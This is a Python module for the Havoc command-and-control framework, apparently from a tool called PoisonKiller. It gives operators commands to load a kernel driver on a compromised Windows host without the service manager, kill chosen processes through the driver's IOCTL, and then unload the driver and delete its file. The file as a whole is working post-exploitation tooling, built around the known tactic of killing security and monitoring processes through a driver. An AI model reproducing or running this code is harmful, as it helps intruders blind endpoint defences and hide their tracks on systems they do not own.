import os
from havoc import Demon, RegisterCommand, RegisterModule
from struct import pack, calcsize
import random
import string

# ── CONFIGURATION ─────────────────────────────────────────────
# Set this to the absolute path of the cloned repository
# Example: BASE_DIR = "/home/user/tools/PoisonKiller"
BASE_DIR = "/path/to/PoisonKiller"

# ── Packer ───────────────────────────────────────────────────

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addStr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        s += b'\x00'
        fmt = "<L{}s".format(len(s))
        self.buffer += pack(fmt, len(s), s)
        self.size += calcsize(fmt)

    def addWStr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-16-le")
        s += b'\x00\x00'
        fmt = "<L{}s".format(len(s))
        self.buffer += pack(fmt, len(s), s)
        self.size += calcsize(fmt)

    def addInt(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

# ── Helpers ──────────────────────────────────────────────────

def random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

BOF_DIR    = os.path.join(BASE_DIR, "out")
STATE_FILE = os.path.join(BASE_DIR, ".pk_state")

def load_bof(name):
    path = os.path.join(BOF_DIR, f"{name}.x64.o")
    if not os.path.isfile(path):
        raise FileNotFoundError(f"BOF not found: {path}")
    return path

def save_state(drv_name, sys_path):
    try:
        with open(STATE_FILE, "w") as f:
            f.write(f"{drv_name}:{sys_path}")
    except Exception as e:
        print(f"[!] Failed to save state: {e}")

def load_state():
    try:
        if os.path.isfile(STATE_FILE):
            with open(STATE_FILE) as f:
                parts = f.read().strip().split(":", 1)
                if len(parts) == 2:
                    return parts[0], parts[1]
    except Exception as e:
        print(f"[!] Failed to read state: {e}")
    return None, None

def clear_state():
    try:
        if os.path.isfile(STATE_FILE):
            os.remove(STATE_FILE)
    except Exception as e:
        print(f"[!] Failed to clear state: {e}")

# In-memory state — restored from disk on script reload
state = {"drv_name": None, "sys_path": None}

# Restore state on script load
_drv, _sys = load_state()
if _drv:
    state["drv_name"] = _drv
    state["sys_path"]  = _sys
    print(f"[*] State restored: driver='{_drv}' path='{_sys}'")

# ── Commands ─────────────────────────────────────────────────

def cmd_load(demonID, *args):
    demon = Demon(demonID)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] Usage: pk-load \"<path_to_sys>\"\n")
        return None

    sys_path = args[0].strip()
    drv_name = random_name()

    packer = Packer()
    packer.addWStr(sys_path)
    packer.addWStr(drv_name)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[*] Loading driver '{drv_name}' from {sys_path}")

    demon.InlineExecute(TaskID, "go",
        load_bof("bof_loaddriver"), packer.getbuffer(), False)

    state["drv_name"] = drv_name
    state["sys_path"]  = sys_path
    save_state(drv_name, sys_path)

    return TaskID

def cmd_kill(demonID, *args):
    demon = Demon(demonID)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] Usage: pk-kill <PID>\n")
        return None

    try:
        pid = int(args[0].strip())
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] PID must be an integer\n")
        return None

    packer = Packer()
    packer.addInt(pid)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[*] Killing process PID {pid}")

    demon.InlineExecute(TaskID, "go",
        load_bof("bof_killprocess"), packer.getbuffer(), False)

    return TaskID

def cmd_kill_multi(demonID, *args):
    demon = Demon(demonID)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] Usage: pk-kill-multi <PID1> <PID2> ... <PIDN>\n")
        return None

    pids = []
    for a in args:
        try:
            pid = int(a.strip())
            if pid > 0:
                pids.append(pid)
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                f"[!] Invalid PID: {a}\n")
            return None

    if len(pids) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] No valid PIDs provided\n")
        return None

    packer = Packer()
    packer.addInt(len(pids))
    for pid in pids:
        packer.addInt(pid)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[*] pk-kill-multi: {len(pids)} PIDs -> {pids}")

    demon.InlineExecute(TaskID, "go",
        load_bof("bof_kill_multi"), packer.getbuffer(), False)

    return TaskID

def cmd_unload(demonID, *args):
    demon = Demon(demonID)

    # If no arguments, try to use stored state
    if len(args) < 1:
        drv_name = state.get("drv_name")
        if not drv_name:
            drv_name, _ = load_state()
        if not drv_name:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "[!] No driver loaded. Use pk-load first or provide driver name.\n")
            return None
    else:
        drv_name = args[0].strip()

    packer = Packer()
    packer.addWStr(drv_name)
    packer.addWStr("")  # sys_path not needed for unload

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[*] Unloading driver '{drv_name}'")

    demon.InlineExecute(TaskID, "go",
        load_bof("bof_unloaddriver"), packer.getbuffer(), False)

    # State is NOT cleared here — confirm with pk-clear-state
    return TaskID

def cmd_delete(demonID, *args):
    demon = Demon(demonID)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] Usage: pk-delete \"<path>\"\n")
        return None

    path = args[0].strip()

    packer = Packer()
    packer.addWStr(path)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"[*] Deleting {path}")

    demon.InlineExecute(TaskID, "go",
        load_bof("bof_delete"), packer.getbuffer(), False)

    return TaskID

def cmd_clear_state(demonID, *args):
    demon = Demon(demonID)
    clear_state()
    state["drv_name"] = None
    state["sys_path"]  = None
    demon.ConsoleWrite(demon.CONSOLE_INFO, "[+] State cleared\n")
    return None

def cmd_status(demonID, *args):
    demon = Demon(demonID)
    drv   = state.get("drv_name") or "none"
    path  = state.get("sys_path")  or "none"
    disco = os.path.isfile(STATE_FILE)
    demon.ConsoleWrite(demon.CONSOLE_INFO,
        f"[*] Status:\n"
        f"    Driver name : {drv}\n"
        f"    Sys path    : {path}\n"
        f"    Disk state  : {'yes -> ' + STATE_FILE if disco else 'no'}\n")
    return None

def cmd_debug(demonID, *args):
    demon  = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "[*] Debug BOF")
    demon.InlineExecute(TaskID, "go",
        load_bof("bof_debug"), b'\x00\x00\x00\x00', False)
    return TaskID

# ── Command Registration ──────────────────────────────────────

RegisterCommand(cmd_load,         "", "pk-load",
    "Load driver via NtLoadDriver (no SCM)",
    0, "pk-load \"<path_to_sys>\"", "[!] Usage: pk-load \"<path>\"\n")

RegisterCommand(cmd_kill,         "", "pk-kill",
    "Kill a process via driver IOCTL",
    0, "pk-kill <PID>", "[!] Usage: pk-kill <PID>\n")

RegisterCommand(cmd_kill_multi,   "", "pk-kill-multi",
    "Kill multiple processes in rapid succession",
    0, "pk-kill-multi <PID1> <PID2> ... <PIDN>", "")

RegisterCommand(cmd_unload,       "", "pk-unload",
    "Unload driver (uses stored state if no args provided)",
    0, "pk-unload [driver_name] [sys_path]", "")

RegisterCommand(cmd_delete,       "", "pk-delete",
    "Delete the .sys file from disk",
    0, "pk-delete \"<path>\"", "")

RegisterCommand(cmd_clear_state,  "", "pk-clear-state",
    "Clear module state after successful unload",
    0, "pk-clear-state", "")

RegisterCommand(cmd_status,       "", "pk-status",
    "Show current module state",
    0, "pk-status", "")

RegisterCommand(cmd_debug,        "", "pk-debug",
    "API diagnostic test on the target",
    0, "pk-debug", "")
